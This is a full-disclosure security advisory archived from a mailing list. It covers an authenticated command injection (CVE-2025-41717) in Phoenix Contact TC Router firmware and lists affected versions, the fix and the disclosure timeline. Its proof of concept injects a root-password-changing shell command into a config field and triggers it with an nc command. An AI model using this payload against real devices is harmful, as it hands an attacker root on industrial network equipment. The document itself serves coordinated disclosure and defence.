---
title: CyberDanube Security Research 20260119-0 | Authenticated Command Injection in Phoenix Contact TC Router Series
url: https://seclists.org/fulldisclosure/2026/Feb/3
source: Full Disclosure
date: 2026-02-05
fetch_date: 2026-02-06T04:10:23.724072
---

# CyberDanube Security Research 20260119-0 | Authenticated Command Injection in Phoenix Contact TC Router Series

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](2)
[By Date](date.html#3)
[![Next](/images/right-icon-16x16.png)](4)

[![Previous](/images/left-icon-16x16.png)](2)
[By Thread](index.html#3)
[![Next](/images/right-icon-16x16.png)](4)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20260119-0 | Authenticated Command Injection in Phoenix Contact TC Router Series

---

*From*: Thomas Weber | CyberDanube via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Tue, 3 Feb 2026 11:13:05 +0000

---

```
CyberDanube Security Research 20260119-0
-------------------------------------------------------------------------------
                title| Authenticated Command Injection
              product| TC Router 5004T-5G EU
   vulnerable version| 1.06.18
        fixed version| 1.06.23
           CVE number| CVE-2025-41717
               impact| High
             homepage| https://www.phoenixcontact.com/
                found| 16.04.2025
                   by| D. Blagojevic, S. Dietz, F. Koroknai, T. Weber
                     | CyberDanube Security Research
                     | Vienna | St. Pölten
                     | This research was conducted in cooperation with VERBUND
                     | OT Cyber Security Lab during a penetration test.
                     |
                     | https://www.cyberdanube.com
                     |
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"What we do
Connecting, distributing, and controlling power and data flows - we have been
developing the right products for this purpose since 1923. Whether in
industrial production facilities, in the field of renewable energies, in
infrastructure, or for complex device connections: our solutions are used
wherever processes must run automatically. Above and beyond their pure
function, they help our partners to develop sustainable applications with more
efficient processes and reduced costs.

We are Phoenix Contact: With innovative products and solutions, we are paving
the way to a climate-neutral and sustainable world."

Source: https://www.phoenixcontact.com/en-us/company

Vulnerable versions
-------------------------------------------------------------------------------
Tested on TC Router version 1.06.18

According to the vendor, the following other products are also affected:

Product Name | Affected Firmware Version
TC ROUTER 3002T-3G | < FW 3.08.8
TC ROUTER 2002T-3G | < FW 3.08.8
TC ROUTER 3002T-4G | < FW 3.08.8
TC ROUTER 3002T-4G GL| < FW 3.08.8
TC ROUTER 5004T-5G EU | < FW 1.06.23
TC ROUTER 3002T-4G VZW | < FW 3.08.8
TC ROUTER 3002T-4G ATT | < FW 3.08.8
TC ROUTER 2002T-4G | < FW 3.08.8
CLOUD CLIENT 1101TTX/TX | < FW 3.07.7
TC CLOUD CLIENT 1002-4G ATT | < FW 3.08.8
TC CLOUD CLIENT 1002-TX/TX | < FW 3.07.7

Vulnerability overview
-------------------------------------------------------------------------------
1) Authenticated Code Execution (CVE-2025-41717)
The device is vulnerable to an authenticated code injection. An attacker with
valid credentials could abuse this issue to execute code as root.

Proof of Concept
-------------------------------------------------------------------------------
1) Authenticated Code Execution (CVE-2025-41717)
The config-upload endpoint can be used to inject arbitrary commands which
get executed when polling the sock_server. The malicous config changes the
root password and enables the service.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<entry name="conf/smtp/auth">1</entry>
<entry name="conf/smtp/from">p () t com&apos;$(echo &quot;root:password1!&quot;|ch
passwd)&apos;</entry>
<entry name="conf/smtp/local">1</entry>
<entry name="conf/smtp/password">asdasdasd</entry>
<entry name="conf/smtp/port">25</entry>
<entry name="conf/smtp/server">192.168.19.138</entry>
[...]
<entry name="conf/alerts/sock_enable">1</entry>
<entry name="conf/alerts/sock_port">14323</entry>
<entry name="conf/alerts/sock_xml_io">0</entry>
<entry name="conf/alerts/sock_xml_nl">1</entry>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Connecting to the service and sending a mail triggers the command.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$ nc 192.168.19.133 14323
<?xml version="1.0"?>
<email to="pwned () pwned com">
<subject>pwned</subject>
<body>
</body>
</email>

-------------------------------------------------------------------------------

Solution
-------------------------------------------------------------------------------
Install the latest available update. See vendor advisory for detailed version
information.

Workaround
-------------------------------------------------------------------------------
Restrict network access to the device.

Recommendation
-------------------------------------------------------------------------------
Configuration file reviews are recommended before they got applied to the
device.

Contact Timeline
-------------------------------------------------------------------------------
2025-07-17: Sent advisory to Phoenix Contact PSIRT.
2025-07-29: Vendor asked for a call to clarify the vulnerabilities.
2025-07-31: Aligned on timeline for September during call.
2025-08-19: Vendor confirmed publications for 2025-10-14. Confirmed the
            shift.
2025-09-25: Asked the vendor for another call to clarify details regarding all
            affected devices (including other advisories).
2025-09-26: Talked to vendor to clarify details.
2025-10-09: Asked for CVE Numbers. Received and included them in the advisory.
2025-11-18: Phone call with vendor. Agreed publication date after 2026-01-13.
2026-01-19: Coordinated release of security advisory.

Web: https://www.cyberdanube.com
Twitter: https://twitter.com/cyberdanube
Mail: research at cyberdanube dot com

EOF T.Weber / @2026

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](2)
[By Date](date.html#3)
[![Next](/images/right-icon-16x16.png)](4)

[![Previous](/images/left-icon-16x16.png)](2)
[By Thread](index.html#3)
[![Next](/images/right-icon-16x16.png)](4)

### Current thread:

* **CyberDanube Security Research 20260119-0 | Authenticated Command Injection in Phoenix Contact TC Router Series** *Thomas Weber | CyberDanube via Fulldisclosure (Feb 04)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](htt...